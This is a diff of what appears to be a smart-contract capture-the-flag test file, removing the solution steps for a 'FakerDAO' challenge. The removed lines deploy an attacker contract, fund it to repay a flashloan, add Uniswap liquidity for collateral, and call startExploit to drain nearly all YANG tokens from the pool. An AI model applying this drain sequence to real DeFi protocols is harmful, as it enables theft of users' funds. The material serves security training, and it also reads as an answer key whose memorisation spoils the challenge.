@@ -64,21 +64,6 @@ before(async () => {
 
 it("solves the challenge", async function () {
 
-  const fakerDAOAttackerFactory = await ethers.getContractFactory('FakerDAOAttacker')
-  let fakerDAOAttacker = await fakerDAOAttackerFactory.connect(attacker).deploy(uniswapFactory.address,yinToken.address,yangToken.address,fakerDAO.address)
-
-  // attacker contract needs funds to pay back flashloan
-  await yangToken.connect(attacker).transfer(fakerDAOAttacker.address,precision.mul(4_000))
-
-  // attacker contract needs LP to post as collateral
-  await yangToken.connect(attacker).approve(uniswapRouter.address,precision.mul(1_000))
-  await yinToken.connect(attacker).approve(uniswapRouter.address,precision.mul(1_000))
-
-  await uniswapRouter.connect(attacker).addLiquidity(yinToken.address,yangToken.address,precision.mul(1_000),precision.mul(1_000),1,1,fakerDAOAttacker.address,ethers.constants.MaxUint256) // attacker contract will get 1000 LP tokens
-
-  // run the exploit
-  await fakerDAOAttacker.connect(attacker).startExploit(precision.mul(1_001_000).sub(1)) // take all YANG tokens from pool but 1 wei
-
 });
 
 after(async () => {
